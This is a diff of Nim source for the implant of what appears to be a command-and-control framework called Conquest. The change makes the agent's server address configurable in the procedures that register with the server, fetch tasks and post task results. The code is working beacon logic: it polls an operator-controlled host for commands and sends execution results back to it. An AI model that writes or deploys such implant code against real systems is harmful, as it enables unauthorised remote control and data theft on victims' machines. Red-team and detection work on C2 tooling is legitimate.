@@ -2,7 +2,7 @@ import httpclient, json, strformat, asyncdispatch
 
 import ./[types, agentinfo]
 
-proc register*(listener: string): string = 
+proc register*(config: AgentConfig): string = 
 
     let client = newAsyncHttpClient()
 
@@ -24,20 +24,20 @@ proc register*(listener: string): string =
 
     try:
         # Register agent to the Conquest server
-        return waitFor client.postContent(fmt"http://localhost:5555/{listener}/register", $body)
+        return waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/register", $body)
     except CatchableError as err:
         echo "[-] [register]:", err.msg
         quit(0)
     finally:
         client.close()
 
-proc getTasks*(listener: string, agent: string): seq[Task] = 
+proc getTasks*(config: AgentConfig, agent: string): seq[Task] = 
 
     let client = newAsyncHttpClient()
 
     try:
         # Register agent to the Conquest server
-        let responseBody = waitFor client.getContent(fmt"http://localhost:5555/{listener}/{agent}/tasks")
+        let responseBody = waitFor client.getContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/tasks")
         return parseJson(responseBody).to(seq[Task])
 
     except CatchableError as err:
@@ -48,7 +48,7 @@ proc getTasks*(listener: string, agent: string): seq[Task] =
 
     return @[]
 
-proc postResults*(listener, agent: string, task: Task): bool = 
+proc postResults*(config: AgentConfig, agent: string, task: Task): bool = 
     
     let client = newAsyncHttpClient()
 
@@ -61,7 +61,7 @@ proc postResults*(listener, agent: string, task: Task): bool =
 
     try:
         # Register agent to the Conquest server
-        discard waitFor client.postContent(fmt"http://localhost:5555/{listener}/{agent}/{task.id}/results", $taskJson)
+        discard waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/{task.id}/results", $taskJson)
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
         echo "[-] [postResults]: ", err.msg
